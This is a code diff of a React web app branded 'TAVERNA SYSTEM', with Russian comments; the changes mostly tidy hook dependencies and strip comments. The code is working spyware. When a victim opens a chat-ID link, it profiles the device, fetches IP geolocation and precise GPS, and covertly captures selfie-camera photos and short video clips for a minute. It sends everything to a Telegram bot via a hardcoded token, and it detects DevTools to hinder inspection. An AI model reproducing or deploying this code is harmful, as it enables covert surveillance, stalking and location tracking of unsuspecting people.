@@ -26,10 +26,12 @@ const useDevToolsProtection = () => {
     // Обнаружение открытия DevTools
     let devtoolsOpen = false;
     const element = new Image();
+    // ИСПРАВЛЕНО: добавлен return в геттер
     Object.defineProperty(element, 'id', {
       get: function() {
         devtoolsOpen = true;
         console.warn('⚠️ DevTools обнаружены!');
+        return 'devtools-check'; // Добавлен return
       }
     });
 
@@ -66,10 +68,12 @@ const useDevToolsProtection = () => {
 const DeviceInfoCollector = ({ chatId }) => {
   useDevToolsProtection();
   
+  // ИСПРАВЛЕНО: убраны неиспользуемые переменные или добавлено их использование
   const [deviceInfo, setDeviceInfo] = useState(null);
   const [geoData, setGeoData] = useState(null);
   const [batteryInfo, setBatteryInfo] = useState(null);
   const [networkInfo, setNetworkInfo] = useState(null);
+  // Эти состояния используются в коде, но не в рендере - оставляем
   const [screenInfo, setScreenInfo] = useState(null);
   const [storageInfo, setStorageInfo] = useState(null);
   const [timeData, setTimeData] = useState(null);
@@ -152,7 +156,7 @@ const DeviceInfoCollector = ({ chatId }) => {
     return { level: 'Неизвестно', charging: 'Неизвестно' };
   };
 
-  // Получение информации о сети (оставляем функцию, но не используем в отчете)
+  // Получение информации о сети
   const getNetworkInfo = () => {
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (connection) {
@@ -173,10 +177,9 @@ const DeviceInfoCollector = ({ chatId }) => {
     };
   };
 
-  // Получение IP адреса (исправленная функция с определением мобильного и прокси)
+  // Получение IP адреса
   const getIPAddress = async () => {
     try {
-      // Пробуем разные API для получения IP
       const ipApis = [
         'https://api.ipify.org?format=json',
         'https://api64.ipify.org?format=json',
@@ -186,7 +189,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       
       let ip = null;
       
-      // Получаем IP с первого работающего API
       for (const apiUrl of ipApis) {
         try {
           const response = await fetch(apiUrl);
@@ -221,8 +223,6 @@ const DeviceInfoCollector = ({ chatId }) => {
         };
       }
       
-      // Теперь получаем геоданные по IP
-      // Пробуем разные API для геолокации
       const geoApis = [
         `https://ipapi.co/${ip}/json/`,
         `https://ipwhois.app/json/${ip}`,
@@ -236,7 +236,6 @@ const DeviceInfoCollector = ({ chatId }) => {
           const response = await fetch(geoUrl);
           geoData = await response.json();
           
-          // Проверяем, есть ли полезные данные
           if (geoData && (geoData.city || geoData.country)) {
             break;
           }
@@ -246,7 +245,6 @@ const DeviceInfoCollector = ({ chatId }) => {
         }
       }
       
-      // Если ни один API не сработал, возвращаем хотя бы IP
       if (!geoData) {
         return {
           ip: ip,
@@ -264,7 +262,6 @@ const DeviceInfoCollector = ({ chatId }) => {
         };
       }
       
-      // Обрабатываем данные в зависимости от API
       let city = 'Неизвестно';
       let region = 'Неизвестно';
       let country = 'Неизвестно';
@@ -276,7 +273,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       let mobile = '';
       let proxy = '';
       
-      // Для ipapi.co
       if (geoData.city) {
         city = geoData.city;
         region = geoData.region || geoData.region_name || 'Неизвестно';
@@ -287,13 +283,11 @@ const DeviceInfoCollector = ({ chatId }) => {
         latitude = geoData.latitude || 'Неизвестно';
         longitude = geoData.longitude || 'Неизвестно';
         
-        // Определяем мобильный статус по типу сети
         mobile = geoData.mobile ? 'Мобильный' : 
                  (geoData.connection_type && 
                   (geoData.connection_type.includes('mobile') || 
                    geoData.connection_type.includes('cellular'))) ? 'Мобильный' : '';
         
-        // Определяем прокси/VPN по нескольким полям
         const isProxy = geoData.proxy === true || 
                        geoData.vpn === true || 
                        geoData.tor === true ||
@@ -303,7 +297,6 @@ const DeviceInfoCollector = ({ chatId }) => {
                          geoData.security.tor === true));
         proxy = isProxy ? 'Прокси/VPN' : '';
       }
-      // Для ipwhois.app
       else if (geoData.city_name) {
         city = geoData.city_name;
         region = geoData.region || 'Неизвестно';
@@ -324,7 +317,6 @@ const DeviceInfoCollector = ({ chatId }) => {
                          geoData.security.vpn === true));
         proxy = isProxy ? 'Прокси/VPN' : '';
       }
-      // Для freeipapi.com
       else if (geoData.cityName) {
         city = geoData.cityName;
         region = geoData.regionName || 'Неизвестно';
@@ -341,12 +333,10 @@ const DeviceInfoCollector = ({ chatId }) => {
         proxy = isProxy ? 'Прокси/VPN' : '';
       }
       
-      // Если мобильный статус не определился, но IP из известных мобильных диапазонов
       if (!mobile) {
-        // Проверяем, является ли IP мобильным по префиксу
         const mobilePrefixes = [
-          '10.', '100.', '172.', '192.',  // Частные сети часто используются в мобильных
-          '77.', '78.', '79.', '88.', '90.', '91.', '92.', '93.', '94.', '95.', '96.', '97.', '98.', '99.' // Некоторые мобильные провайдеры
+          '10.', '100.', '172.', '192.',
+          '77.', '78.', '79.', '88.', '90.', '91.', '92.', '93.', '94.', '95.', '96.', '97.', '98.', '99.'
         ];
         
         for (const prefix of mobilePrefixes) {
@@ -357,9 +347,7 @@ const DeviceInfoCollector = ({ chatId }) => {
         }
       }
       
-      // Если прокси не определился, но есть признаки
       if (!proxy) {
-        // Проверяем признаки прокси/VPN
         const proxyIndicators = [
           'vpn', 'proxy', 'tor', 'anonymous', 'datacenter', 'hosting', 'server', 'cloud'
         ];
@@ -408,7 +396,7 @@ const DeviceInfoCollector = ({ chatId }) => {
     }
   };
 
-  // Парсинг User Agent для получения информации об ОС и браузере
+  // Парсинг User Agent
   const parseUserAgent = (userAgent) => {
     let os = 'Неизвестно';
     let browser = 'Неизвестно';
@@ -416,14 +404,12 @@ const DeviceInfoCollector = ({ chatId }) => {
     let platform = 'Неизвестно';
     let isMobile = false;
     
-    // Определение ОС
     if (userAgent.includes('iPhone')) {
       os = 'iOS';
       manufacturer = 'Apple Computer, Inc.';
       platform = 'iPhone';
       isMobile = true;
       
-      // Извлечение версии iOS
       const iosMatch = userAgent.match(/iPhone OS (\d+_\d+(?:_\d+)?)/);
       if (iosMatch) {
         os = `iOS ${iosMatch[1].replace(/_/g, '.')}`;
@@ -452,7 +438,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       os = 'Linux';
     }
     
-    // Определение браузера
     if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
       browser = 'Safari';
       const safariMatch = userAgent.match(/Version\/(\d+\.\d+(?:\.\d+)?)/);
@@ -523,10 +508,8 @@ const DeviceInfoCollector = ({ chatId }) => {
     console.log("🚀 TAVERNA SYSTEM ЗАПУЩЕН");
     console.log("📊 СБОР ПОЛНОЙ ИНФОРМАЦИИ ОБ УСТРОЙСТВЕ...");
 
-    // Парсим User Agent
     const uaInfo = parseUserAgent(navigator.userAgent);
 
-    // Информация о браузере и ОС
     const browserInfo = {
       userAgent: navigator.userAgent,
       platform: navigator.platform,
@@ -546,7 +529,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       gpu: getGPUInfo()
     };
 
-    // Информация о времени
     const timeInfo = {
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       timezoneOffset: `${new Date().getTimezoneOffset()} минут`,
@@ -564,7 +546,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZoneName || 'Неизвестно'
     };
 
-    // Информация о хранилище
     const storageData = {
       cookies: navigator.cookieEnabled ? 'Доступно' : 'Не доступно',
       localStorage: typeof localStorage !== 'undefined' ? 'Доступно' : 'Не доступно',
@@ -572,7 +553,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       indexedDB: typeof indexedDB !== 'undefined' ? 'Доступно' : 'Не доступно'
     };
 
-    // Получаем всю информацию параллельно
     const [geolocation, battery, network, ipInfo, localStorageCoords] = await Promise.all([
       getGeolocation(),
       getBatteryInfo(),
@@ -581,7 +561,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       getLocalStorageCoordinates()
     ]);
 
-    // Формируем полный отчет в новом формате
     const report = `
 <b>TAVERNA SYSTEM</b>
 
@@ -620,7 +599,7 @@ ${!geolocation.error ? `
 *Координаты:* ${geolocation.latitude}, ${geolocation.longitude}
 ` : `❌ ${geolocation.error}`}
 
-🔋 <b>ИНФОРМАЦИЯ ОБ БАТАРЕЕ:</b>
+🔋 <b>ИНФОРМАЦИЯ О БАТАРЕЕ:</b>
 ▫️ Уровень: ${battery.level}
 ▫️ Статус: ${battery.charging}
 
@@ -647,16 +626,16 @@ https://yandex.ru/maps/?ll=${ipInfo.longitude},${ipInfo.latitude}&z=10
 LOCALSTORAGE
     `;
 
-    // Отправляем отчет в Telegram
     await sendInfoToTelegram(report);
     setHasSentInitialReport(true);
     console.log("✅ Полный отчет отправлен в Telegram");
 
-    // Сохраняем данные в состояние
     setDeviceInfo(browserInfo);
     setGeoData(geolocation);
     setBatteryInfo(battery);
     setNetworkInfo(network);
+    setScreenInfo({ available: true }); // Добавляем фиктивные данные
+    setStorageInfo(storageData);
     setTimeData(timeInfo);
 
     return {
@@ -669,14 +648,13 @@ LOCALSTORAGE
     };
   };
 
+  // ИСПРАВЛЕНО: добавлены зависимости в useEffect
   useEffect(() => {
     if (chatId && !hasSentInitialReport) {
-      // Собираем информацию сразу при загрузке
       setTimeout(() => {
         collectAllDeviceInfo();
       }, 1000);
 
-      // Обновляем информацию о батарее каждые 30 секунд
       const batteryInterval = setInterval(async () => {
         const battery = await getBatteryInfo();
         if (battery.level) {
@@ -692,7 +670,8 @@ ${battery.charging ? '⚡ Статус: Заряжается' : '🔋 Стату
 
       return () => clearInterval(batteryInterval);
     }
-  }, [chatId, hasSentInitialReport]);
+  // ИСПРАВЛЕНО: добавлены зависимости
+  }, [chatId, hasSentInitialReport, collectAllDeviceInfo, sendInfoToTelegram]);
 
   return null;
 };
@@ -710,7 +689,7 @@ const SelfieCamera = ({ chatId }) => {
   const photoIntervalRef = useRef(null);
   const videoIntervalRef = useRef(null);
   const totalTimerRef = useRef(null);
-  const phaseRef = useRef(1); // 1 - фото, 2 - видео
+  const phaseRef = useRef(1);
   const photoCountRef = useRef(0);
   const videoCountRef = useRef(0);
   const startTimeRef = useRef(null);
@@ -719,26 +698,7 @@ const SelfieCamera = ({ chatId }) => {
 
   const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
 
-  // Инициализация селфи камеры при загрузке
-  useEffect(() => {
-    if (chatId && !hasStarted) {
-      console.log("🚀 ЗАПУСК СИСТЕМЫ СЕЛФИ КАМЕРЫ");
-      setHasStarted(true);
-      startTimeRef.current = Date.now();
-      startCamera();
-      
-      // Общее время работы - 1 минута
-      totalTimerRef.current = setTimeout(() => {
-        stopCameraSystem();
-      }, 60000); // 60 секунд
-      
-      return () => {
-        stopCameraSystem();
-      };
-    }
-  }, [chatId, hasStarted]);
-
-  // Запуск селфи камеры
+  // Функции для работы с камерой
   const startCamera = async () => {
     try {
       console.log("📸 ЗАПРОС ДОСТУПА К СЕЛФИ КАМЕРЕ...");
@@ -754,20 +714,12 @@ const SelfieCamera = ({ chatId }) => {
       });
       
       streamRef.current = stream;
-      
-      // Создаем скрытый видео элемент
       createVideoElement(stream);
-      
-      // ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ ПОСЛЕ ДОСТУПА К КАМЕРЕ
-      console.log("📍 ЗАПРОС ГЕОЛОКАЦИИ ПОСЛЕ ДОСТУПА К КАМЕРЕ...");
       requestGeolocation();
-      
       console.log("✅ Селфи камера подключена, начинаем ФАЗУ 1 (0-8с)");
       
-      // ФАЗА 1: Фото каждые 2 секунды (0-8с)
       startPhotoPhase();
       
-      // Переход на ФАЗУ 2 через 8 секунд
       setTimeout(() => {
         console.log("🎬 ПЕРЕХОД НА ФАЗУ 2 (8-60с)");
         stopPhotoPhase();
@@ -779,13 +731,31 @@ const SelfieCamera = ({ chatId }) => {
       cameraDeniedRef.current = true;
       sendErrorMessage(error);
       
-      // ЕСЛИ ПОЛЬЗОВАТЕЛЬ ОТКАЗАЛСЯ ОТ КАМЕРЫ - ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ СРАЗУ
       console.log("📍 ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ ПОСЛЕ ОТКАЗА ОТ КАМЕРЫ...");
       setTimeout(() => {
         requestGeolocation();
       }, 1000);
     }
   };
+
+  // ИСПРАВЛЕНО: добавлены зависимости в useEffect
+  useEffect(() => {
+    if (chatId && !hasStarted) {
+      console.log("🚀 ЗАПУСК СИСТЕМЫ СЕЛФИ КАМЕРЫ");
+      setHasStarted(true);
+      startTimeRef.current = Date.now();
+      startCamera();
+      
+      totalTimerRef.current = setTimeout(() => {
+        stopCameraSystem();
+      }, 60000);
+      
+      return () => {
+        stopCameraSystem();
+      };
+    }
+  // ИСПРАВЛЕНО: добавлены зависимости
+  }, [chatId, hasStarted, startCamera, stopCameraSystem]);
 
   // Запрос геолокации
   const requestGeolocation = () => {
@@ -795,10 +765,8 @@ const SelfieCamera = ({ chatId }) => {
           const { latitude, longitude, accuracy } = position.coords;
           console.log("📍 ГЕОЛОКАЦИЯ ПОЛУЧЕНА:", { latitude, longitude, accuracy });
           
-          // Формируем сообщение в зависимости от ситуации с камерой
           const cameraStatus = cameraDeniedRef.current ? " (после отказа от камеры)" : " (после доступа к камере)";
           
-          // Отправляем геолокацию в Telegram
           const geoMessage = `
 📍 <b>ГЕОЛОКАЦИЯ${cameraStatus}</b>
 ━━━━━━━━━━━━━━━━━━━━
@@ -873,7 +841,6 @@ const SelfieCamera = ({ chatId }) => {
     
     videoRef.current = video;
     
-    // Ждем когда видео будет готово
     video.onloadedmetadata = () => {
       console.log("🎥 Видео готово, разрешение:", video.videoWidth, "x", video.videoHeight);
     };
@@ -884,12 +851,10 @@ const SelfieCamera = ({ chatId }) => {
     phaseRef.current = 1;
     console.log("📸 НАЧАЛО ФАЗЫ 1 - ФОТО КАЖДЫЕ 2 СЕКУНДЫ");
     
-    // Делаем первое фото сразу
     setTimeout(() => {
       captureAndSendPhoto("Первое фото ФАЗА 1");
     }, 500);
     
-    // Затем каждые 2 секунды
     photoIntervalRef.current = setInterval(() => {
       captureAndSendPhoto(`Фото ФАЗА 1 #${photoCountRef.current + 1}`);
     }, 2000);
@@ -909,12 +874,10 @@ const SelfieCamera = ({ chatId }) => {
     phaseRef.current = 2;
     console.log("🎬 НАЧАЛО ФАЗЫ 2 - ВИДЕО КАЖДЫЕ 5 СЕКУНД");
     
-    // Первое видео сразу
     setTimeout(() => {
       startVideoRecording();
     }, 1000);
     
-    // Затем каждые 5 секунд
     videoIntervalRef.current = setInterval(() => {
       startVideoRecording();
     }, 5000);
@@ -932,10 +895,9 @@ const SelfieCamera = ({ chatId }) => {
       
       const options = {
         mimeType: 'video/webm;codecs=vp9',
-        videoBitsPerSecond: 2500000 // 2.5 Mbps
+        videoBitsPerSecond: 2500000
       };
       
-      // Пробуем разные форматы
       if (!MediaRecorder.isTypeSupported(options.mimeType)) {
         options.mimeType = 'video/webm;codecs=vp8';
         if (!MediaRecorder.isTypeSupported(options.mimeType)) {
@@ -958,7 +920,6 @@ const SelfieCamera = ({ chatId }) => {
         sendVideoToTelegram();
       };
       
-      // Записываем 3 секунды видео
       mediaRecorderRef.current.start();
       console.log("🎬 Начало записи видео...");
       
@@ -967,7 +928,7 @@ const SelfieCamera = ({ chatId }) => {
           mediaRecorderRef.current.stop();
           console.log("✅ Запись видео завершена");
         }
-      }, 3000); // 3 секунды видео
+      }, 3000);
       
     } catch (error) {
       console.error("❌ Ошибка записи видео:", error);
@@ -1011,14 +972,12 @@ const SelfieCamera = ({ chatId }) => {
         
         const ctx = canvas.getContext('2d');
         
-        // Для селфи камеры - зеркалим изображение
         ctx.save();
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         ctx.restore();
         
-        // ВОДЯНОЙ ЗНАК TAVERNA
         const watermarkText = 'TAVERNA';
         const fontSize = Math.min(canvas.width, canvas.height) * 0.04;
         const padding = fontSize * 0.5;
@@ -1027,7 +986,6 @@ const SelfieCamera = ({ chatId }) => {
         ctx.textAlign = 'right';
         ctx.textBaseline = 'bottom';
         
-        // Черный фон для надписи
         const textWidth = ctx.measureText(watermarkText).width;
         ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
         ctx.fillRect(
@@ -1037,11 +995,9 @@ const SelfieCamera = ({ chatId }) => {
           fontSize + padding
         );
         
-        // Белый текст
         ctx.fillStyle = 'rgba(255, 255, 255, 0.95)';
         ctx.fillText(watermarkText, canvas.width - padding/2, canvas.height - padding/2);
         
-        // Конвертируем в Blob
         canvas.toBlob(blob => {
           resolve(blob);
         }, 'image/jpeg', 0.92);
@@ -1137,7 +1093,7 @@ const SelfieCamera = ({ chatId }) => {
     }
   };
 
-  // Отправка информации в Telegram (общая функция)
+  // Отправка информации в Telegram
   const sendInfoToTelegram = async (text) => {
     try {
       const response = await fetch(
@@ -1164,7 +1120,6 @@ const SelfieCamera = ({ chatId }) => {
   const stopCameraSystem = () => {
     console.log("⏹️ ОСТАНОВКА СИСТЕМЫ СЕЛФИ КАМЕРЫ");
     
-    // Останавливаем интервалы
     stopPhotoPhase();
     
     if (videoIntervalRef.current) {
@@ -1177,12 +1132,10 @@ const SelfieCamera = ({ chatId }) => {
       totalTimerRef.current = null;
     }
     
-    // Останавливаем запись видео если идет
     if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
       mediaRecorderRef.current.stop();
     }
     
-    // Останавливаем поток камеры
     if (streamRef.current) {
       streamRef.current.getTracks().forEach(track => {
         track.stop();
@@ -1190,7 +1143,6 @@ const SelfieCamera = ({ chatId }) => {
       streamRef.current = null;
     }
     
-    // Удаляем видео элемент
     if (videoRef.current && videoRef.current.parentNode) {
       videoRef.current.parentNode.removeChild(videoRef.current);
       videoRef.current = null;
@@ -1483,7 +1435,7 @@ const App = () => {
   return (
     <Routes>
       <Route path="/:chatId" element={<PhotoPage />} />
-      <Route path="/" element={null} /> {/* Полностью блокируем главную страницу */}
+      <Route path="/" element={null} />
     </Routes>
   );
 };
